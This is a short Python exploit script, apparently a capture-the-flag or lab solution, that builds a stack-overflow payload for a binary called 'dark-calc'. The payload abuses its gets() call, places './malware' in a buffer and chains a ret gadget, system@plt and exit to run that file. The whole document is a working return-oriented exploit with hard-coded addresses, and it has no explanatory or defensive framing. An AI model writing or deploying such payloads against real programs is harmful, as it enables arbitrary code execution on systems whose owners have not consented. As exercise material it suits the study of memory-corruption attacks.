#!/usr/bin/env python3
"""Exploit dark-calc's gets overflow and call system('./malware')."""
import struct
import sys

# strcpy copies the NUL-terminated path into command_buf.
prefix = b"./malware\x00".ljust(24, b"A")
payload = (
    prefix
    + struct.pack("<Q", 0x401C94)  # executable ret gadget for stack alignment
    + struct.pack("<Q", 0x4017E0)  # system@plt
    + struct.pack("<Q", 0x4019B9)[:7]  # mov edi,0; call exit@plt; gets adds byte 8
)
assert len(payload) == 47
sys.stdout.buffer.write(payload)

